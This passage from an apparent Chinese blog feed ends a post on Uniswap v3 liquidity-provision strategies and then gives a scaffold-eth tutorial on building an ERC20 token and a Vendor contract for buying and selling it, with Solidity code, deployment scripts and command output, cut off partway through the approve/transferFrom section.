src="https://user-images.githubusercontent.com/3297411/190839510-80e1e8bd-3204-4566-a11c-b4c268246038.png" alt="Untitled 10"></p><p>如果价格提升到 180， 再平衡之后，基础订单为 [130, 230]，若此时策略有 1.2 ETH 和 90USDC，则策略会使用 0.5EHT 和 90USDC 放入基础订单中，剩余 0.7ETH 会用于在 [180, 200] 之间的再平衡订单。</p><p>实际操作：</p><p><a href="https://dune.com/queries/78325/155734?Number%20of%20days=200">https://dune.com/queries/78325/155734?Number of days=200</a></p><p><strong>效果</strong></p><p>蓝色曲线</p><p><img src="https://user-images.githubusercontent.com/3297411/190839522-c5c425e6-a397-4809-a96e-3a36c20ee8b5.png" alt="Untitled 11"></p><p>实际效果：</p><p><a href="https://dune.com/mxwtnb/Alpha-Vaults-Performance?Number+of+days=200&amp;Number+of+days_t4072e=500">https://dune.com/mxwtnb/Alpha-Vaults-Performance?Number+of+days=200&amp;Number+of+days_t4072e=500</a></p><h3><span id="ce-lue-er-yu-qi-jie-ge-fan-wei-ce-lue-expected-price-range-strategies">策略二：预期价格范围策略（expected price range strategies）</span></h3><p>从历史数据中预测未来10分钟的价格走势，得到一个价格范围区间，在这个价格范围区间中提供流动性。直到当前价格超出价格范围，重复上述过程，重新预测价格范围并添加流动性。这个价格范围称为“预期价格范围”。同时我们可以在当前价格没有完全超出预期价格范围时调整价格区间，称这个价格范围为“移动策略范围（move strategy ranges）”，这个范围指示了什么时候需要移动。</p><img width="479" alt="Untitled 12" src="https://user-images.githubusercontent.com/3297411/190839530-f02eb060-6daf-4545-8166-35ecf2e34270.png"><p><strong>如何设置</strong></p><p>2018年3月~2020年4月的十分钟数据得出价格移动分布在 [-3%, 3%] 之间。可以设置百分比作为价格波动区间。</p><img width="501" alt="Untitled 13" src="https://user-images.githubusercontent.com/3297411/190839533-07b08d89-e42d-471c-84c3-85444226f677.png"><p><strong>进一步策略</strong>：在预期价格范围内不采用一致的流动性，而是采用多个连续的流动性多头，每个多头存入不同数量的资产。</p><p>三种策略：</p><ul><li>均匀策略：在价格区间内均匀分布，Uniswap v3 默认；</li><li>比例策略：在价格区间内分成子价格区间，权重对应价格可能的变化概率放置；</li><li>最优策略：使用决策理论（比如马尔可夫决策过程），计算一个模型来估算“最佳”范围来提供流动性，使用 LP 的“风险规避”程度作为参数。</li></ul><p><strong>比例策略：</strong></p><ul><li>Ba: 预期价格范围</li><li>Bt: 移动策略范围</li></ul><p>蓝线为概率分布，使用小的价格区间实现</p><img width="509" alt="Untitled 14" src="https://user-images.githubusercontent.com/3297411/190839543-c3e52671-e05b-4f1b-8e8a-dfeed7f886d1.png"><p><strong>结论：</strong></p><ul><li>对于厌恶风险的投资者，均匀策略最优，对于其他所有人来说是次优的；</li><li>比例策略对于大部分厌恶风险的投资者来说的接近最优的；</li><li>对于最厌恶风险的投资者而言，均匀策略可获利。</li></ul><p><img src="https://user-images.githubusercontent.com/3297411/190839545-ec74a8e6-e5bb-4ed2-8712-630db12c2226.png" alt="Untitled 15"></p><p>比例策略对于风险偏向 LP 提供者是最优的（ $\alpha$大 ），而均匀分配对于风险规避LP提供者是最优的（ $\alpha$ 小）。</p><p>这意味着，在 Uniswap v3 中被动管理的头寸可能不足以以资本效率和平衡风险赚取费用，积极的流动性提供策略既是机遇也是挑战。</p><h3><span id="qi-ta-zhu-dong-de-liu-dong-xing-guan-li">其他主动的流动性管理</span></h3><p>其他主动策略 dapp</p><ul><li><a href="https://xtoken.market/app/invest">xToken project</a></li><li><a href="https://www.gelato.network/">Gelato Network</a></li><li><a href="https://www.visor.finance/">Visor Finance team</a></li><li><a href="http://Charm.fi">Charm.fi</a>’s <a href="https://alpha.charm.fi/">Alpha Vaults</a></li><li><a href="https://mellow.finance/vault">Mellow Protocol</a></li></ul><p><img src="https://user-images.githubusercontent.com/3297411/190839551-e149cbf3-10fb-46c1-9a58-5507499ac6ea.png" alt="Untitled 16"></p><h2><span id="can-kao">参考</span></h2><ul><li><a href="https://newsletter.banklesshq.com/p/how-to-avoid-impermanent-loss">How to avoid Impermanent Loss</a></li><li><a href="https://newsletter.banklesshq.com/p/10-going-bankless-with-uniswap-caleb">Going Bankless with Uniswap</a></li><li><a href="https://newsletter.banklesshq.com/p/how-to-make-money-with-uniswap-v3">How to make money with Uniswap V3</a></li><li><a href="https://newsletter.banklesshq.com/p/a-guide-to-uniswap-on-optimism">A Guide to Uniswap on Optimism</a></li><li><strong><strong>Uniswap Liquidity Provision: Is the Yield Worth the Risk?：</strong></strong><a href="https://medium.com/gammaswap-labs/uniswap-liquidity-provision-is-the-yield-worth-the-risk-c45a4a850700">https://medium.com/gammaswap-labs/uniswap-liquidity-provision-is-the-yield-worth-the-risk-c45a4a850700</a></li><li><a href="https://betterprogramming.pub/uniswap-v2-in-depth-98075c826254">https://betterprogramming.pub/uniswap-v2-in-depth-98075c826254</a></li><li><a href="https://liaoph.com/uniswap-v3-1/">https://liaoph.com/uniswap-v3-1/</a></li><li><a href="https://www.theblockbeats.info/news/24654">https://www.theblockbeats.info/news/24654</a></li><li><a href="https://medium.com/charmfinance/introducing-alpha-vaults-an-lp-strategy-for-uniswap-v3-ebf500b67796">https://medium.com/charmfinance/introducing-alpha-vaults-an-lp-strategy-for-uniswap-v3-ebf500b67796</a></li><li><a href="https://medium.com/@DeFiScientist/rebalancing-vs-passive-strategies-for-uniswap-v3-liquidity-pools-754f033bdabc">https://medium.com/@DeFiScientist/rebalancing-vs-passive-strategies-for-uniswap-v3-liquidity-pools-754f033bdabc</a></li><li><a href="https://uniswap.org/blog/fee-returns">https://uniswap.org/blog/fee-returns</a></li><li><a href="https://uniswapv3.flipsidecrypto.com/">https://uniswapv3.flipsidecrypto.com/</a></li><li><a href="https://newsletter.banklesshq.com/p/how-to-automate-uniswap-v3-liquidity">https://newsletter.banklesshq.com/p/how-to-automate-uniswap-v3-liquidity</a></li><li><a href="https://kydo.substack.com/p/palm-protocol-owned-active-liquidity">https://kydo.substack.com/p/palm-protocol-owned-active-liquidity</a></li></ul><h3><span id="comments">Comments</span></h3>]]></content>
    
    <summary type="html">
    
      Uniswap v3 无常损失分析
    
    </summary>
    
    
      <category term="区块链" scheme="https://qiwihui.com/tags/%E5%8C%BA%E5%9D%97%E9%93%BE/"/>
    
      <category term="投研" scheme="https://qiwihui.com/tags/%E6%8A%95%E7%A0%94/"/>
    
      <category term="DeFi" scheme="https://qiwihui.com/tags/DeFi/"/>
    
  </entry>
  
  <entry>
    <title>如何创建一个代币承销商 dApp</title>
    <link href="https://qiwihui.com/qiwihui-blog-155/"/>
    <id>https://qiwihui.com/qiwihui-blog-155/</id>
    <published>2024-05-15T02:25:31.342Z</published>
    <updated>2024-05-15T02:25:31.468Z</updated>
    
    <content type="html"><![CDATA[<p>这篇教程我们来完成 scaffold-eth 项目的第二个挑战：<a href="https://speedrunethereum.com/challenge/token-vendor">代币承销商</a>，我们可以在网站 <a href="http://speedrunethereum.com/">speedrunethereum.com</a> 中查看或者直接查看对应的 Github 连接：<a href="https://github.com/scaffold-eth/scaffold-eth-typescript-challenges">scaffold-eth/scaffold-eth-typescript-challenges</a>。</p><p>这个挑战的目的是创建一个自己的ERC20代币，并编写承销商合约，实现用户对代币的购买和卖出。下面，我们一步步完成这个过程。</p><span id="more"></span><h3><span id="yi-an-zhuang-bing-she-zhi-huan-jing">一、安装并设置环境</span></h3><p>首先，我们下载项目，并初始化环境。</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/scaffold-eth/scaffold-eth-typescript-challenges.git challenge-2-token-vendor</span><br><span class="line"><span class="built_in">cd</span> challenge-2-token-vendor</span><br><span class="line">git checkout challenge-2-token-vendor</span><br><span class="line">yarn install</span><br></pre></td></tr></table></figure><p>安装好依赖包之后，我们可以看到项目的主要目录为 <code>packages</code>，包含一下子目录</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">packages/</span><br><span class="line">├── hardhat-ts</span><br><span class="line">├── services</span><br><span class="line">├── subgraph</span><br><span class="line">└── vite-app-ts</span><br></pre></td></tr></table></figure><p>其中：</p><ul><li><code>hardhat-ts</code> 是项目合约代码，包含合约文件以及合约的部署等；</li><li><code>services</code> The Graph 协议的 graph-node 配置；</li><li><code>subgraph</code> The Graph 协议相应的处理设置，包括 mappings，数据结构等；</li><li><code>vite-app-ts</code> 前端项目，主要负责用户与合约交互。</li></ul><p>The Graph 协议是去中心化的区块链数据索引协议，本片教程中暂时不涉及。我们需要启动三个命令终端，分别用于运行以下命令：</p><ul><li><code>yarn chain</code> 使用 hardhat 运行本地区块链，作为合约部署的本地测试链；</li><li><code>yarn deploy</code> 编译、部署和发布合约；</li><li><code>yarn start</code> 启动 react 应用的前端；</li></ul><p>按顺序分别运行上述命令之后，此时我们就可以在 <code>http://localhost:3000</code>中访问我们的应用。如果需要重新部署合约，运行 <code>yarn deploy --reset</code> 即可。</p><p><img src="https://user-images.githubusercontent.com/3297411/155913563-c0e773b7-60d1-4e5f-bdf7-2c4b0ae1df74.png" alt="yarn-start"></p><h2><span id="er-bian-xie-erc20-dai-bi-he-yue">二、编写 ERC20 代币合约</span></h2><p>现在我们进入合约编写部分。我们的目标是编写一个 ERC20 代币合约，并为创建者铸造 1000 个代币。</p><h3><span id="shi-me-shi-erc20-he-yue-biao-zhun">什么是 ERC20 合约标准</span></h3><p>代币可以在以太坊中表示任何东西，比如信誉积分，黄金等，而 ERC-20 提供了一个同质化代币的标准，每个代币与另一个代币（在类型和价值上）完全相同。</p><p>ERC20是各个代币的标准接口，包含以下方法：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 名称</span><br><span class="line">function name() public view returns (string)</span><br><span class="line">// 符号</span><br><span class="line">function symbol() public view returns (string)</span><br><span class="line">// 合约使用的小数位，常见为 18</span><br><span class="line">function decimals() public view returns (uint8)</span><br><span class="line">// 代币总供应量</span><br><span class="line">function totalSupply() public view returns (uint256)</span><br><span class="line">// 地址的代币持有量</span><br><span class="line">function balanceOf(address _owner) public view returns (uint256 balance)</span><br><span class="line">// 代币划转</span><br><span class="line">function transfer(address _to, uint256 _value) public returns (bool success)</span><br><span class="line">// 用于划转代币，但这些代币不一定属于调用合约的用户</span><br><span class="line">function transferFrom(address _from, address _to, uint256 _value) public returns (bool success)</span><br><span class="line">// 合约授予用户代币管理权限，调用者设置 spender 消费自己 amount 数量的代币</span><br><span class="line">function approve(address _spender, uint256 _value) public returns (bool success)</span><br><span class="line">// 检查代币的可消费余额</span><br><span class="line">function allowance(address _owner, address _spender) public view returns (uint256 remaining)</span><br><span class="line"></span><br><span class="line">// 事件</span><br><span class="line">// 代币转移事件</span><br><span class="line">event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line">// 当调用 approve 时，触发 Approval 事件</span><br><span class="line">event Approval(</span><br><span class="line">    address indexed owner,</span><br><span class="line">    address indexed spender,</span><br><span class="line">    uint256 value</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>其中，合约必需设置 <code>totalSupply</code>、 <code>balanceOf</code> 、 <code>transfer</code> 、 <code>transferFrom</code>、 <code>approve</code> 以及 <code>allowance</code> 这六个函数，其他如 <code>name</code>、 <code>symbol</code> 和 <code>decimalsze</code> 则是可选实现。</p><h3><span id="shi-yong-openzeppelin-ku">使用 OpenZeppelin 库</span></h3><p>如果从上述的合约标准开始，我们需要实现这六个函数的方法，幸运的是，OpenZeppelin 库是一个成熟的合约开发库，为我们实现了 ERC20 代币基本功能，我们可以基于这个库开发我们的 ERC20 代币，这将大大减少我们的工作量。我们可以在 <a href="https://docs.openzeppelin.com/contracts/4.x/erc20">ERC20 标准</a> 页面查到相关的使用方法。</p><p>除了 ERC20，OpenZeppelin 库还提供了其他合约标准的实现，比如 ERC721，ERC777等，以及大量的经过安全审计的库，这些对于我们快速开发和实现安全的合约代码提供了支持。</p><h3><span id="bian-xie-dai-ma">编写代码</span></h3><p>我们使用 ERC20.sol 来实现我们的合约，创见一个名为 <code>GOLD</code> 的代币，代币符号为 <code>GLD</code>，并为创建者铸造 1000 个代币：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">import <span class="string">&#x27;@openzeppelin/contracts/token/ERC20/ERC20.sol&#x27;</span>;</span><br><span class="line"></span><br><span class="line">// learn more: https://docs.openzeppelin.com/contracts/3.x/erc20</span><br><span class="line"></span><br><span class="line">  constructor() public ERC20(<span class="string">&#x27;Gold&#x27;</span>, <span class="string">&#x27;GLD&#x27;</span>) &#123;</span><br><span class="line">    // 铸造 1000 * 10 ** 18 给 msg.sender</span><br><span class="line">    _mint(msg.sender, 1000 * 10 ** 18);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>_mint</code> 方法是 ERC20 提供的方法，该方法创建相应数量的代币，并将代币发送给账户：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/** @dev Creates `amount` tokens and assigns them to `account`, increasing</span><br><span class="line"> * the total supply.</span><br><span class="line"> *</span><br><span class="line"> * Emits a &#123;Transfer&#125; event with `from` set to the zero address.</span><br><span class="line"> *</span><br><span class="line"> * Requirements:</span><br><span class="line"> *</span><br><span class="line"> * - `account` cannot be the zero address.</span><br><span class="line"> */</span><br><span class="line">function _mint(address account, uint256 amount) internal virtual &#123;</span><br><span class="line">    require(account != address(0), &quot;ERC20: mint to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">    _beforeTokenTransfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">    _totalSupply += amount;</span><br><span class="line">    _balances[account] += amount;</span><br><span class="line">    emit Transfer(address(0), account, amount);</span><br><span class="line"></span><br><span class="line">    _afterTokenTransfer(address(0), account, amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>代码地址：<a href="https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L248">https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol#L248</a></p><h3><span id="bu-shu-jiao-ben">部署脚本</span></h3><p>接着我们使用脚本进行部署，并向地址发送 1000 代币，地址可以在 <code>http://localhost:3000</code> 中连接我们的 Metamask 得到。部署脚本地址：<code>packages/hardhat-ts/deploy/00_deploy_your_token.ts</code>。</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> yourToken = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&#x27;YourToken&#x27;</span>, deployer);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 发送代币</span></span><br><span class="line">  <span class="keyword">const</span> result = <span class="keyword">await</span> yourToken.<span class="title function_">transfer</span>(<span class="string">&#x27;0x169841AA3024cfa570024Eb7Dd6Bf5f774092088&#x27;</span>, ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;1000&#x27;</span>));</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>然后我们运行 <code>yarn deploy --reset</code> 部署合约。</p><h3><span id="yan-zheng">验证</span></h3><ol><li><p>使用 Debug 页面功能进行检查，查看用户账户中的代币余额，可以看到账户中有 1000 个代币；</p><p><img src="https://user-images.githubusercontent.com/3297411/155913531-951312e7-ea2e-497e-a323-722ecd295ca4.png" alt="balance"></p></li><li><p>使用 <code>transfer()</code> 将代币转给另一个账户；</p><p>在 Debug 中，使用 <code>transfer</code> 功能，输入目标钱包地址 <code>0xc12ae5Ba30Da6eB11978939379D383beb5Df9b33</code>，以及发送的数量 <code>1000000000000000000000</code>（1000*1E18，1后边有21个0），点击发送。等交易完成之后，可以分别查看原来账户和目标账户的代币数量，可以看到原来的变成了 0，目标账户是 1000。</p><p><img src="https://user-images.githubusercontent.com/3297411/155913544-122451a0-8533-46cf-9aa3-7f90e8fa59ab.png" alt="transfer"></p></li></ol><p>注意：</p><ul><li>如果发送时出现余额不足的提示，可以使用页面左下角的 Faucet 为账户充值。</li><li>验证完成之后，需要将 <code>00_deploy_your_token.ts</code> 中的 transfer 代码注释了，不然会影响之后的步骤。</li></ul><h2><span id="san-cheng-xiao-shang-he-yue-gou-mai">三、承销商合约 — 购买</span></h2><p>接下来，我们创建一个承销商合约，这个合约允许用户通过以太购买代币。</p><p>为了完成这个功能，我们需要：</p><ol><li>设置兑换比例，教程中为 <code>tokensPerEth=100</code> ，也就是 1个以太可以兑换 100 GLD；</li><li>实现 <code>buyTokens</code> 函数，这个函数必须是 <code>payable</code>，可以接受发送的以太，计算对应的 <code>GLD</code> 数量，然后使用 <code>transfer</code> 将相应的 <code>GLD</code> 代币发送给购买者 <code>msg.sender</code>；</li><li>触发一个 <code>BuyTokens</code> 事件，记录购买者，使用的 ETH 数量以及购买的 GLD 数量；</li><li>实现第二个函数 <code>withdraw</code>，用来将合约中的 ETH 全部提取到合约的所有者（owner）地址。我们可以使用两种方式设置合约的所有者：<ol><li>部署时，使用我们能控制的钱包地址进行部署，并设置所有者；</li><li>使用任意地址部署，部署结束之后进行合约所有权转移；</li></ol></li></ol><p>在这个教程中，我们使用第二个方式，这样我们可以不用将我们控制的地址的私钥添加到项目配置中，降低暴露。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity &gt;=0.8.0 &lt;0.9.0;</span><br><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line"></span><br><span class="line">import &quot;@openzeppelin/contracts/access/Ownable.sol&quot;;</span><br><span class="line">import &#x27;./YourToken.sol&#x27;;</span><br><span class="line"></span><br><span class="line">contract Vendor is Ownable &#123;</span><br><span class="line">  YourToken yourToken;</span><br><span class="line">  uint256 public tokensPerEth = 100;</span><br><span class="line"></span><br><span class="line">  // 购买代币事件</span><br><span class="line">  event BuyTokens(address buyer, uint256 amountOfEth, uint256 amountOfTokens);</span><br><span class="line"></span><br><span class="line">  constructor(address tokenAddress) public &#123;</span><br><span class="line">    yourToken = YourToken(tokenAddress);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 允许用户使用 EHT 购买代币</span><br><span class="line">  function buyTokens() payable public &#123;</span><br><span class="line">    // 检查是否有足够的 ETH</span><br><span class="line">    require(msg.value &gt; 0, &quot;Not enought ether&quot;);</span><br><span class="line"></span><br><span class="line">    uint256 amountOfTokens = msg.value * tokensPerEth;</span><br><span class="line"></span><br><span class="line">    // 检查承销商是否有足够的代币</span><br><span class="line">    uint256 tokenBalance = yourToken.balanceOf(address(this));</span><br><span class="line">    require(tokenBalance &gt; amountOfTokens, &quot;Not enought tokens&quot;);</span><br><span class="line">    </span><br><span class="line">    // 发送代币</span><br><span class="line">    bool sent =  yourToken.transfer(msg.sender, amountOfTokens);</span><br><span class="line">    require(sent, &quot;Failed to transfer token to the buyer&quot;);</span><br><span class="line"></span><br><span class="line">    emit BuyTokens(msg.sender, msg.value, amountOfTokens);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  // 允许所有者取出所有代币</span><br><span class="line">  function withdraw() public onlyOwner &#123;</span><br><span class="line"></span><br><span class="line">    uint256 balance = address(this).balance;</span><br><span class="line">    require(balance &gt; 0, &quot;No ether to withdraw&quot;);</span><br><span class="line">    </span><br><span class="line">    // 发送代币给所有者</span><br><span class="line">    (bool sent, ) = msg.sender.call&#123;value: balance&#125;(&quot;&quot;);</span><br><span class="line">    require(sent, &quot;Failed to withdraw balance&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">  // ToDo: create a sellTokens() function:</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中， <code>Ownable</code> 可以进行权限控制，合约提供的<code>onlyOwner</code>修改器可以用来限制某些特定合约函数的访问权限。在这里，我们的 <code>withdraw</code> 函数必需限制合约的所有这才能提取所有的资金。同时，这个合约提供了 <code>transferOwnership</code> 函数，可以用来转移合约的所有者，这个将在我们的脚本部分中使用。</p><p>对于部署脚本，我们需要完成以下功能：</p><ol><li>在部署的时候将所有的代币发送到承销商的合约地址 <code>vendor.address</code> ，而不是我们之前的地址；</li><li>为了能将承销商合约中的所有 ETH 提取出来，需要将合约的所有权 <code>ownership</code> 转移到我们能控制的地址，比如我们在前端使用的地址。</li></ol><p>脚本位置： <code>packages/hardhat-ts/deploy/01_deploy_vendor.ts</code></p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"> <span class="comment">// You might need the previously deployed yourToken:</span></span><br><span class="line"> <span class="keyword">const</span> yourToken = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&#x27;YourToken&#x27;</span>, deployer);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 部署承销商合约</span></span><br><span class="line"> <span class="keyword">await</span> <span class="title function_">deploy</span>(<span class="string">&#x27;Vendor&#x27;</span>, &#123;</span><br><span class="line">   <span class="comment">// Learn more about args here: https://www.npmjs.com/package/hardhat-deploy#deploymentsdeploy</span></span><br><span class="line">   <span class="attr">from</span>: deployer,</span><br><span class="line">   <span class="attr">args</span>: [yourToken.<span class="property">address</span>],</span><br><span class="line">   <span class="attr">log</span>: <span class="literal">true</span>,</span><br><span class="line"> &#125;);</span><br><span class="line"><span class="comment">// 获取部署的合约</span></span><br><span class="line"> <span class="keyword">const</span> vendor = <span class="keyword">await</span> ethers.<span class="title function_">getContract</span>(<span class="string">&#x27;Vendor&#x27;</span>, deployer);</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 发送 1000 个代币给承销商</span></span><br><span class="line"> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;\n 🏵  Sending all 1000 tokens to the vendor...\n&#x27;</span>);</span><br><span class="line"> <span class="keyword">await</span> yourToken.<span class="title function_">transfer</span>(vendor.<span class="property">address</span>, ethers.<span class="property">utils</span>.<span class="title function_">parseEther</span>(<span class="string">&#x27;1000&#x27;</span>));</span><br><span class="line"></span><br><span class="line"> <span class="comment">// 转移所有权</span></span><br><span class="line"> <span class="keyword">await</span> vendor.<span class="title function_">transferOwnership</span>(<span class="string">&#x27;0x169841AA3024cfa570024Eb7Dd6Bf5f774092088&#x27;</span>);</span><br></pre></td></tr></table></figure><h3><span id="bu-shu-he-yue">部署合约</span></h3><p>完成上述代码之后，我们重新部署我们的合约：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">yarn deploy --reset</span><br></pre></td></tr></table></figure><p>对应的输出结果为：</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line">$ yarn deploy --reset</span><br><span class="line"></span><br><span class="line"><span class="title class_">Compiling</span> <span class="number">7</span> files <span class="keyword">with</span> <span class="number">0.8</span><span class="number">.6</span></span><br><span class="line"><span class="title class_">Generating</span> typings <span class="attr">for</span>: <span class="number">7</span> artifacts <span class="keyword">in</span> <span class="attr">dir</span>: ../vite-app-ts/src/generated/contract-types <span class="keyword">for</span> <span class="attr">target</span>: ethers-v5</span><br><span class="line"><span class="title class_">Successfully</span> generated <span class="number">15</span> typings!</span><br><span class="line"><span class="title class_">Compilation</span> finished successfully</span><br><span class="line">deploying <span class="string">&quot;YourToken&quot;</span> (<span class="attr">tx</span>: <span class="number">0x758e492bc71e9de37cf109aa6aa966fc6c042d086babce32ddd76af02ec22acb</span>)...: deployed at <span class="number">0x0DCd1Bf9A1b36cE34237eEaFef220932846BCD82</span> <span class="keyword">with</span> <span class="number">639137</span> gas</span><br><span class="line">deploying <span class="string">&quot;Vendor&quot;</span> (<span class="attr">tx</span>: <span class="number">0x7b0402937081b72f59abb9994e3773b0283116e1106665766af31bf246b466cc</span>)...: deployed at <span class="number">0x9A676e781A523b5d0C0e43731313A708CB607508</span> <span class="keyword">with</span> <span class="number">482680</span> gas</span><br><span class="line"></span><br><span class="line"> 🏵  <span class="title class_">Sending</span> all <span class="number">1000</span> tokens to the vendor...</span><br></pre></td></tr></table></figure><p>可以从命令行输出中看到合约部署的地址为：</p><ul><li>承销商合约地址： <code>0x9A676e781A523b5d0C0e43731313A708CB607508</code></li><li>代币地址： <code>0x0DCd1Bf9A1b36cE34237eEaFef220932846BCD82</code></li></ul><h3><span id="yan-zheng">验证</span></h3><p>我们通过以下步骤进行验证：</p><ol><li><p>通过 Debug 页面查看承销商 （Vendor）合约地址初始时是否有 1000 个代币；</p></li><li><p>使用 0.1 ETH 购买 10 个 GLD：我们使用 Buy Tokens 功能购买 10 个代币，可以看到此时的价格约为 0.1 ETH（ETH 价格为 2766.7 美元）。</p><p><img src="https://user-images.githubusercontent.com/3297411/155913532-492474ae-5a67-4fcc-8c37-eb768c8ae18e.png" alt="buyTokens"></p></li><li><p>将购买的代币发送给另一个账户：同样使用页面 Transfer Tokens 功能完成；</p><p><img src="https://user-images.githubusercontent.com/3297411/155913543-fe8f7c93-aa6b-4333-8c3f-87dd30ced5d6.png" alt="tokenBalance"></p></li><li><p>使用所有者账户，查看是否能全部取出合约中的 ETH：在 Debug 页面，我们使用 <code>withdraw</code> 功能，尝试将承销商合约中的 ETH 全部取出，可以看到，当交易完成以后，合约的余额变为了0：</p></li></ol><pre><code>![vendorBalanceBefore](https://user-images.githubusercontent.com/3297411/155913554-5f0e78f5-0836-4d53-b0b8-adb44a37413c.png)变为：![vendorBalanceAfter](https://user-images.githubusercontent.com/3297411/155913548-289343ef-d51a-4fbb-8134-071918589636.png)</code></pre><h2><span id="si-cheng-xiao-shang-he-yue-hui-gou">四、承销商合约 — 回购</span></h2><p>接下来我们添加承销商合约的回购代币功能，也就是允许用户通过发送代币给承销商合约，承销商合约将对应的ETH发给用户账户。但是在以太坊中，合约只能通过 payable 接受 ETH，无法接受直接发送代币，如果直接向合约发送代币，代币将会永久消失。所以在 ERC20 标准中，我们需要使用 <code>approve</code> 和 <code>tranferFrom</code> 者两个函数来完成这个过程。</p><figure class="highlight tsx"><table><tr><td class="code"><pre><span class="line"><span class="title function_">approve</span>(address spender, uint256 amount) -&gt; bool</span><br><span class="line"><span class="title function_">transferFrom</span>(address <span class="keyword">from</span>, address to, uint256 amount) -&gt; bool</span><br></pre></td></tr></table></figure><p>首先，用户通过调用 <code>approve</code> 函数授权承销商合约（ <code>spender</code> ）处理 <code>amount</code> 数量的代币，然后，调用 <code>transferFrom</code> 函数将代币从用户账户（ <code>from</code> ）转移 <code>amount</code> 数量的代币给承销商合约（ <code>to</code> ）。这其中的难点在于 <code>approve</code> 和 <code>transferFrom</code> 函数。我们来看一下这两个函数在 OpenZeppelin 中具体实现，首先是 <code>approve</code>：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">  mapping(address =&gt; mapping(address =&gt; uint256)) private _allowances;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line">   * @dev See &#123;IERC20-approve&#125;.</span><br><span class="line">   *</span><br><span class="line">   * NOTE: If `amount` is the maximum `uint256`, the allowance is not updated on</span><br><span class="line">   * `transferFrom`. This is semantically equivalent to an infinite approval.</span><br><span class="line">   *</span><br><span class="line">   * Requirements:</span><br><span class="line">   *</span><br><span class="line">   * - `spender` cannot be the zero address.</span><br><span class="line">   */</span><br><span class="line">  function approve(address spender, uint256 amount) public virtual override returns (bool) &#123;</span><br><span class="line">      address owner = _msgSender();</span><br><span class="line">      _approve(owner, spender, amount);</span><br><span class="line">      return true;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  /**</span><br><span class="line">   * @dev Sets `amount` as the allowance of `spender` over the `owner` s tokens.</span><br><span class="line">   *</span><br><span class="line">   * This internal function is equivalent to `approve`, and can be used to</span><br><span class="line">   * e.g. set automatic allowances for certain subsystems, etc.</span><br><span class="line">   *</span><br><span class="line">   * Emits an &#123;Approval&#125; event.</span><br><span class="line">   *</span><br><span class="line">   * Requirements:</span><br><span class="line">   *</span><br><span class="line">   * - `owner` cannot be the zero address.</span><br><span class="line">   * - `spender` cannot be the zero address.</span><br><span class="line">   */</span><br><span class="line">  function _approve(</span><br><span class="line">      address owner,</span><br><span class="line">      address spender,</span><br><span class="line">      uint256 amount</span><br><span class="line">  ) internal virtual &#123;</span><br><span class="line">      require(owner != address(0), &quot;ERC20: approve from the zero address&quot;);</span><br><span class="line">      require(spender != address(0), &quot;ERC20: approve to the zero address&quot;);</span><br><span class="line"></span><br><span class="line">      _allowances[owner][spender] = amount;</span><br><span class="line">      emit Approval(owner, spender, amount);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>从上面可以看出， <code>approve</code> 函数调用了 <code>_approve</code>， <code>_approve</code> 中用 <code>_allowances</code> 这个哈希记录了 <code>owner</code> 和 <code>spender</code> 之间的授权数量 <code>amount</code>。因此可以推断， <code>transferFrom</code> 函数以及其他需要授权情况的函数都使用了 <code>_allowances</code> 这个变量，比如 <code>allowance</code> 函数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/**</span><br><span class="line"> * @dev See &#123;IERC20-allowance&#125;.</span><br><span class="line"> */</span><br><span class="line">function allowance(address owner, address spender) public view virtual override returns (uint256) &#123;</span><br><span class="line">    return _allowances[owner][spender];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * @dev Updates `owner` s allowance for `spender` based on spent `amount`.</span><br><span class="line"> *</span><br><span class="line"> * Does not update the allowance amount in case of infinite allowance.</span><br><span class="line"> * Revert if not enough allowance is available.</span><br><span class="line"> *</span><br><span class="line"> * Might emit an &#123;Approval&#125; event.</span><br><span class="line"> */</span><br><span class="line">function _spendAllowance(</span><br><span class="line">    address owner,</span><br><span class="line">    address spender,</span><br><span class="line">    uint256 amount</span><br><span class="line">) internal virtual &#123;</span><br><span 